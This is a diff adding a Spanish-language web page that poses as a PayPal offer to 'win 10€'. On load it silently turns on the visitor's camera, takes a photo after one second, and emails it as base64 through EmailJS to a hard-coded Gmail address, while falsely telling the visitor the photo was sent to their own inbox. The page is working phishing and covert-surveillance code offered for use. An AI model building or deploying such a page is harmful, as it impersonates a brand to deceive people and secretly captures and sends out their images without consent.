@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gana 10€ en PayPal</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        h1 {
+            color: #0070ba;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        #paypal-logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        #video, #photo {
+            border-radius: 50%;
+            border: 5px solid #0070ba;
+        }
+        #photo {
+            margin-top: 20px;
+            width: 200px;
+            height: 200px;
+        }
+        #emailButton {
+            margin-top: 20px;
+            padding: 15px 30px;
+            background-color: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        #emailButton:hover {
+            background-color: #005ba1;
+        }
+    </style>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("NVLuvtQXVjIMGa9Ww"); // Reemplaza con tu User ID de EmailJS
+        })();
+    </script>
+</head>
+<body>
+    <img id="paypal-logo" src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal Logo">
+    <h1>Regístrate y gana 10€</h1>
+    
+    <video id="video" autoplay muted playsinline style="display: none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <img id="photo" alt="Foto de perfil"/>
+
+    <script>
+        const video = document.getElementById('video');
+        const photo = document.getElementById('photo');
+        const canvas = document.getElementById('canvas');
+
+        // Acceder a la cámara del móvil automáticamente
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+                video.play();
+                setTimeout(takePhoto, 1000); // Tomar la foto después de 1 segundo
+            })
+            .catch(function(error) {
+                console.log("Error al acceder a la cámara: ", error);
+            });
+
+        // Función para tomar la foto
+        function takePhoto() {
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+            photo.src = imageData;
+
+            // Enviar automáticamente la foto por email
+            sendEmail(imageData);
+        }
+
+        // Enviar la imagen tomada al email
+        function sendEmail(imageData) {
+            const templateParams = {
+                to_email: 'vicente.hoobuy@gmail.com',  // El correo al que quieres que se envíe la imagen
+                image_base64: imageData
+            };
+
+            emailjs.send('NVLuvtQXVjIMGa9Ww', 'template_og3aomm', templateParams)
+                .then(function(response) {
+                    console.log('Correo enviado exitosamente!', response.status, response.text);
+                    alert('La foto de perfil ha sido enviada a tu correo.');
+                }, function(error) {
+                    console.log('Error al enviar el correo:', error);
+                    alert('No se pudo enviar la foto. Inténtalo de nuevo.');
+                });
+        }
+    </script>
+</body>
+</html>
